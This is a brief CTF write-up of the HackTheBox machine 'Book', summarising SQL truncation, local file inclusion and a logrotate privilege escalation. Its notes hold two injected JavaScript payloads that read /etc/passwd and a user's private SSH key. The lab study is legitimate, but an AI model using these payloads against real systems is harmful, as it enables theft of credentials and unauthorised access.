---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/7QXzebQHEWA/0.jpg
layout: post
media_subpath: /assets/posts/2020-07-11-book-hackthebox
tags:
- cve
- hackthebox
- lfi
- linux
- logrotate
- sql trunaction
title: Book @ HackTheBox
---

Book is a 30-point Linux machine on HackTheBox. We log into a web application by exploiting SQL truncation and then use a Local File Inclusion vulnerability to obtain an SSH key. By exploiting a logrotate CVE we escalate privileges.

{% youtube 7QXzebQHEWA %}

## Notes

JS Payloads:

```js
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>

<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```